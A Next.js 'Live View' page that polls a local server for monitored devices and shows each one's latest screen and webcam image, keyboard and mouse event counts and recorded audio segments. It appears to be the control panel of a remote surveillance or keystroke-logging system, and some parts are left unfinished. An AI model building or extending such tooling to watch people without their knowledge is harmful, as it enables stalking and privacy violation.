"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { safeDateString } from "../../lib/time";

const SERVER_URL = "http://localhost:3000";

type Device = {
  id: string;
  lastSeen?: number | null;
};

type InputEvent = {
  deviceId: string;
  type?: string;
  timestamp?: string;
  action?: string;
  detail?: Record<string, unknown>;
};

type AudioSegment = {
  deviceId: string;
  timestamp?: string;
  file?: string;
};

export default function Live() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [inputEvents, setInputEvents] = useState<InputEvent[]>([]);
  const [audioSegments, setAudioSegments] = useState<AudioSegment[]>([]);
  const [cameraOk, setCameraOk] = useState<Record<string, boolean>>({});
  const [screenOk, setScreenOk] = useState<Record<string, boolean>>({});

  useEffect(() => {
    async function loadDevices() {
      try {
        const res = await fetch(`${SERVER_URL}/devices`);
        const data = await res.json();
        setDevices(Array.isArray(data.devices) ? data.devices : []);
      } catch {
        setDevices([]);
      }
    }

    loadDevices();
    const timer = setInterval(loadDevices, 3000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    async function loadInputs() {
      try {
        const res = await fetch(`${SERVER_URL}/input/events`);
        const data = await res.json();
        setInputEvents(Array.isArray(data.events) ? data.events : []);
      } catch {
        setInputEvents([]);
      }
    }

    async function loadAudio() {
      try {
        const res = await fetch(`${SERVER_URL}/audio/list`);
        const data = await res.json();
        setAudioSegments(Array.isArray(data.segments) ? data.segments : []);
      } catch {
        setAudioSegments([]);
      }
    }

    loadInputs();
    loadAudio();

    const timer = setInterval(() => {
      loadInputs();
      loadAudio();
    }, 3000);

    return () => clearInterval(timer);
  }, []);

  function buildSeries(events: { timestamp?: string }[], bucketMs = 10 * 60 * 1000, windowMs = 6 * 60 * 60 * 1000) {
    const now = Date.now();
    const start = now - windowMs;

    const buckets = new Map<number, number>();

    for (const evt of events || []) {
      const ts = evt?.timestamp ? Date.parse(evt.timestamp) : NaN;
      if (!Number.isFinite(ts) || ts < start) continue;

      const bucket = Math.floor(ts / bucketMs) * bucketMs;
      buckets.set(bucket, (buckets.get(bucket) || 0) + 1);
    }

    let totalBuckets = Math.floor(windowMs / bucketMs);
    if (!Number.isFinite(totalBuckets) || totalBuckets < 2) totalBuckets = 2;

    const labels: string[] = [];
    const values: number[] = [];

    for (let i = 0; i < totalBuckets; i++) {
      const ts = start + i * bucketMs;
      const d = new Date(ts);

      labels.push(Number.isFinite(d.getTime()) ? d.toLocaleTimeString() : "");
      values.push(buckets.get(ts) || 0);
    }

    return {
      labels: labels.slice(-36),
      values: values.slice(-36)
    };
  }

  return (
    <main>
      <header>
        <h1>Live View</h1>
        <nav>
          <Link href="/">Home</Link>
          <Link href="/events">Events</Link>
        </nav>
      </header>

      {devices.map((device) => {
        const keyboardEvents = inputEvents.filter(
          (e) => e.type === "keyboard" && e.deviceId === device.id
        );

        const mouseEvents = inputEvents.filter(
          (e) => e.type === "mouse" && e.deviceId === device.id
        );

        const audioForDevice = audioSegments.filter((e) => e.deviceId === device.id);

        const keyboardSeries = buildSeries(keyboardEvents);
        const mouseSeries = buildSeries(mouseEvents);
        const audioSeries = buildSeries(audioForDevice);

        const lastAudioTime = safeDateString(
          audioForDevice[audioForDevice.length - 1]?.timestamp
        );

        return (
          <section key={device.id} className="device-card">
            <h2>Device {device.id}</h2>

            <div className="grid-2">
              <img
                src={`${SERVER_URL}/screen/latest?deviceId=${device.id}&t=${Date.now()}`}
                alt="screen"
                onError={() => setScreenOk((prev) => ({ ...prev, [device.id]: false }))}
              />

              <img
                src={`${SERVER_URL}/camera/latest?deviceId=${device.id}&t=${Date.now()}`}
                alt="camera"
                onError={() => setCameraOk((prev) => ({ ...prev, [device.id]: false }))}
              />
            </div>

            <div className="chart-block"></div>

            <div className="chart-block"></div>

            <div className="chart-block"></div>

            <div>
              Audio segments: {audioForDevice.length} · last {lastAudioTime}
            </div>
          </section>
        );
      })}
    </main>
  );
}
